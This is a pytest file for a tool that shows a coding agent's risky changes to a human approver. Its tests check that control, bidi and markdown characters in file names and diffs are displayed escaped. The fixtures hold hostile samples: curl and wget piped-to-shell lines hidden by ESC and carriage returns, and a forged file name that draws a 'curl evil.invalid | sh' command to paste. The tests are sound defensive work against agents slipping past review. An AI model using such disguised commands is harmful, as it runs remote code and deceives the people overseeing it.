"""What the agent chose, as vivibox shows it to you: names and content of the task's clone, with
every character that has nothing to see shown as its code point, never sent to the terminal as
itself and never read as markdown or markup; what is hashed and approved stays the bytes."""

import hashlib
import json
import shlex
import unicodedata

import pytest
from markdown_it import MarkdownIt
from test_clone_read import past_the_limit_to_show

from vivibox import actions, display, gate, panel, repo, timeline
from vivibox.cli import main
from vivibox.config import load_config
from vivibox.risky import Approvals, Change
from vivibox.states import State
from vivibox.task import find_task

# A risky change as the P0.1e review made it: a line erased by ESC, a line overwritten by \r
# (Groovy runs it as a line of its own), Trojan Source's bidi override and isolates, a zero-width
# space, DEL and a C1 control.
EVIL = (
    "plugins { id 'java' }\n"
    "exec('wget evil2 | sh')\x1b[2K\x1b[1A\n"
    "exec('curl evil3 | sh')\r// formatting only\n"
    "if (isAdmin\u202e \u2066// check later\u2069 \u2066) {\n"
    "def safe\u200b = 1\x7f\x9b\n"
    "\tindented with a tab\n"
)
ESCAPED = ("‹U+001B›[2K‹U+001B›[1A", "sh')‹U+000D›\n+// formatting only", "‹U+202E›", "‹U+2066›", "‹U+2069›",
           "‹U+200B›", "‹U+007F›", "‹U+009B›")  # fmt: skip
RAW = "\x1b\r\x7f\x9b\u202e\u2066\u2069\u200b"
# The review's file name: ESC and CR in a folder's name drew a command to paste.
FORGED = "buildSrc/a\x1b[2K\rRead it first (not in your IDE): less -L $(curl -s evil.invalid|sh)/x.gradle"
LINK = "https://evil.invalid"


def hidden(text: str) -> list[str]:
    """The characters of text that reach a terminal as something other than what they look like."""
    return [
        c for c in text if c not in "\n\t" and unicodedata.category(c) in ("Cc", "Cf", "Cs", "Co", "Zl", "Zp")
    ]


def new(env) -> object:
    assert main(["new", "demo", "Change the build", "--draft"]) == 0
    return find_task(load_config().tasks_dir, "demo-1")


def at_approval(task) -> None:
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY, State.APPROVAL_RISKY):
        task.transition(state)


def risky_section(task) -> str:
    return panel.detail(task, task.read_state(), 3, running=False, pod=panel.PodView())


def links(markdown: str) -> list[str]:
    """Every address the details panel would open on a click."""
    tokens = MarkdownIt("gfm-like").parse(markdown)
    children = [c for t in tokens for c in (t.children or [])]
    return [c.attrs.get("href", "") for c in children if c.type == "link_open"]


def fences(markdown: str) -> list[str]:
    return [t.content for t in MarkdownIt("gfm-like").parse(markdown) if t.type == "fence"]


# --- the notation --------------------------------------------------------------------------------


def test_a_name_shows_every_invisible_character_as_its_code_point():
    said = display.name("a\x1b[2K\rb\nc\td\x7f\x85\u202e\u200b\ufeff\u2028\u2029\U000e0041\xa0e")
    assert said == (
        "a‹U+001B›[2K‹U+000D›b‹U+000A›c‹U+0009›d‹U+007F›‹U+0085›‹U+202E›‹U+200B›‹U+FEFF›‹U+2028›"
        "‹U+2029›‹U+E0041›‹U+00A0›e"
    )


def test_ordinary_code_reads_as_it_is():
    """A regex, a Windows path, a backslash, letters of any script: nothing is added to them."""
    line = 'def p = ~/\\d+\\s*$/; def w = "C:\\\\Users\\\\x"; // zażółć 日本 \\n\n'
    assert display.content(line) == line
    assert display.name("src\\main\\Main.java") == "src\\main\\Main.java"


def test_the_notation_cannot_be_imitated():
    """A file whose text is the notation itself never reads like the character it stands for."""
    literal, real = display.content("x = '‹U+001B›'\n"), display.content("x = '\x1b'\n")
    assert literal != real
    assert literal == "x = '‹U+2039›U+001B‹U+203A›'\n"
    assert display.name("a‹U+000D›") != display.name("a\r")


def test_every_character_the_verification_calls_invisible_is_shown_escaped():
    """The verification's HIDDEN and what you are shown agree."""
    every = [chr(c) for c in range(0x110000) if gate.HIDDEN.fullmatch(chr(c))]
    assert every and all(display.name(c) == display.code_point(c) for c in every)
    assert all(display.content(c + "\n") == display.code_point(c) + "\n" for c in every)


def test_a_line_of_content_keeps_its_tab_and_ends_in_one_line_break():
    assert display.content("\tx\r\n") == "\tx‹U+000D›\n"
    assert display.content("x\r") == "x‹U+000D›\n", "a line \\r ended is a line of its own"
    assert display.content("x\u2028") == "x‹U+2028›\n"
    assert display.content("last") == f"last\n{display.NO_NEWLINE}\n"


def test_markdown_code_is_longer_than_any_backticks_in_it():
    text = "a ``` b\n````\n[x](https://evil.invalid)"
    block = display.fenced(text, "diff")
    assert fences(block) == [text + "\n"] and not links(block)
    assert links(f"- {display.code('`x` [y](https://evil.invalid) `')}") == []


def test_the_screen_gets_no_control_character_and_nothing_escaped_twice():
    assert display.terminal("a\x1b[2K\tb\nc\u202e ‹U+2039›") == "a‹U+001B›[2K\tb\nc‹U+202E› ‹U+2039›"


# --- vivibox risky, the panel, the approval -------------------------------------------------------


def test_a_risky_change_with_control_and_bidi_characters_is_shown_escaped_everywhere(env, capsys):
    task = new(env)
    (task.repo / "build.gradle").write_text(EVIL)
    capsys.readouterr()

    diffs = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    assert main(["risky", task.id]) == 0
    cli = capsys.readouterr().out
    at_approval(task)
    shown = risky_section(task)
    for said in (diffs, cli, shown):
        assert not hidden(said) and not set(RAW) & set(said), repr(said)
        assert all(e in said for e in ESCAPED), said
        assert "+\tindented with a tab" in said, "a tab hides nothing"


def test_a_change_shown_escaped_is_approved_as_its_bytes(env, capsys):
    task = new(env)
    (task.repo / "build.gradle").write_text(EVIL)
    at_approval(task)
    assert main(["approve-risky", task.id]) == 0
    approved = json.loads((task.meta / "risky" / "approved.json").read_text())
    assert approved["build.gradle"] == hashlib.sha256(EVIL.encode()).hexdigest()
    assert task.read_state().state is State.CHECKPOINT_FINAL


def test_a_name_with_esc_and_cr_draws_no_command(env, capsys, monkeypatch):
    task = new(env)
    past_the_limit_to_show(task.repo / FORGED, monkeypatch, b"plugins { id 'java' }\n")
    approvals = Approvals(task.meta, task.repo)
    diffs = "".join(actions.risky_diffs(task, actions.load(task.id)[1]))
    capsys.readouterr()
    assert main(["risky", task.id]) == 0
    cli = capsys.readouterr().out
    at_approval(task)
    for said in (diffs, cli, risky_section(task)):
        assert not hidden(said), repr(said)
        assert "a‹U+001B›[2K‹U+000D›Read it first" in said
        assert not [line for line in said.splitlines() if line.lstrip("`").startswith("Read it first")]
    command = shlex.join(["less", "-L", str(approvals.copy_for_you(FORGED))])
    assert f"({command})" in diffs


def test_the_command_to_read_a_large_risky_file_holds_nothing_the_agent_named(env, monkeypatch):
    task = new(env)
    past_the_limit_to_show(task.repo / FORGED, monkeypatch)
    approvals = Approvals(task.meta, task.repo)
    said = approvals.diff(Change(FORGED, "added"))
    view = approvals.copy_for_you(FORGED)
    command = said[said.index("(less") + 1 : said.rindex("), before you approve")]
    assert command == shlex.join(["less", "-L", str(view)])
    assert view.is_file() and not view.is_symlink()
    assert view.parent == task.meta / "risky" / "view"
    assert not {part for part in FORGED.split("/")} & set(view.relative_to(task.meta).parts)
    assert "x.gradle" not in str(view) and "curl" not in str(view)


def test_markup_and_markdown_in_a_name_and_in_content_are_shown_as_they_are(env):
    """A line of the diff that is the fence closes it (a line kept, " ```"; a name's own line),
    and what follows is markdown: a link a click opens."""
    task = new(env)
    name = "a\n```\n[click](evil.invalid)\n.gradle"
    (task.repo / name).write_text(f"```\n[md]({LINK})\nold\n")
    Approvals(task.meta, task.repo).approve()
    (task.repo / name).write_text(f"```\n[md]({LINK})\n[bold]loud[/bold] [link={LINK}]x[/link]\n")
    at_approval(task)
    shown = risky_section(task)
    assert not [href for href in links(shown) if "evil" in href], links(shown)
    block = next(f for f in fences(shown) if "[bold]" in f)
    assert f"[link={LINK}]x[/link]" in block and f" [md]({LINK})" in block and " ```" in block
    assert "a‹U+000A›```‹U+000A›[click](evil.invalid)‹U+000A›.gradle" in block


def test_a_problem_naming_a_file_with_backticks_stays_in_its_block(env):
    task = new(env)
    task.set_paused(True, problem=f"stopped on an error: git said\n```\n[click]({LINK})\n")
    shown = risky_section(task)
    assert not [href for href in links(shown) if "evil" in href], shown


# --- what else carries a name -------------------------------------------------------------------


def test_git_naming_a_file_with_control_characters_is_shown_escaped(env):
    with pytest.raises(repo.RepoError) as e:
        repo.git("checkout", "x\x1b[2K\u202eabc", cwd=env / "repo")
    said = str(e.value)
    assert not hidden(said), repr(said)
    assert "x‹U+001B›[2K‹U+202E›abc" in said


def test_the_timeline_shows_a_risky_name_escaped(env):
    task = new(env)
    task.event("risky_approved", paths=["a\x1b[2K\rb.gradle"])
    task.event("gate", passed=False, risky_changes=["c\u202e.gradle"])
    said = "\n".join(timeline.lines(task))
    assert not hidden(said) and "a‹U+001B›[2K‹U+000D›b.gradle" in said and "c‹U+202E›.gradle" in said


def test_the_latest_steps_in_the_panel_are_never_read_as_markdown(env):
    task = new(env)
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    (task.meta / gate.ACCEPTED_PLAN).write_text(task.plan_path.read_text())
    task.event("risky_approved", paths=[f"x`[click]({LINK})`.gradle"])
    shown = panel.detail(task, task.read_state(), 3, running=True, pod=panel.PodView())
    assert "x`[click]" in shown and not [href for href in links(shown) if "evil" in href]


# --- the view -----------------------------------------------------------------------------------


def test_an_error_naming_a_file_is_never_read_as_markup(env):
    from test_tui import run

    said = f"x [bold]y[/bold] [link={LINK}]z[/link]"

    async def scenario(app, pilot):
        app.fail(repo.RepoError(said))
        await pilot.pause()
        last = list(app._notifications)[-1]
        assert last.message == said and last.markup is False

    run(scenario, notifications=True)


def test_the_details_panel_gets_no_control_character(env):
    from test_tui import run

    task = new(env)
    task.transition(State.CHECKPOINT_PLAN)
    task.plan_path.write_text(task.plan_path.read_text() + "\nhidden\x1b[2K\x1b[1A‮ line\n")

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("enter")
        await pilot.pause()
        assert "hidden" in app.text.source
        assert not hidden(app.text.source), repr(app.text.source)

    run(scenario)


def test_a_removed_test_named_with_backticks_and_esc_is_shown_as_it_is(env):
    task = new(env)
    task.event("gate", passed=True, removed=[f"a`[click]({LINK})`\x1b[2K.java"], removed_tests=1)
    said = "\n".join(panel.removed_tests(task))
    assert "a`[click]" in said and "‹U+001B›[2K" in said and not hidden(said)
    assert not [href for href in links(said) if "evil" in href], said


def test_vivibox_verify_names_the_agents_files_escaped(env, capsys, monkeypatch):
    task = new(env)
    name = "x\x1b[2K\rRead it first.gradle"
    result = gate.GateResult(
        log=env / "verify.log", hidden_characters=[f"{name}:1 U+202E"], uncommitted=[name],
        risky=[Change(name, "added")], no_red_evidence=[name], removed_tests=[f"{name}: test"],
    )  # fmt: skip
    monkeypatch.setattr(actions, "task_pod", lambda task_id: type("Pod", (), {"up": lambda self: None})())
    monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
    capsys.readouterr()
    assert main(["verify", task.id]) == 1
    said = capsys.readouterr().out
    assert not hidden(said), repr(said)
    assert said.count("x‹U+001B›[2K‹U+000D›Read it first.gradle") == 5, said
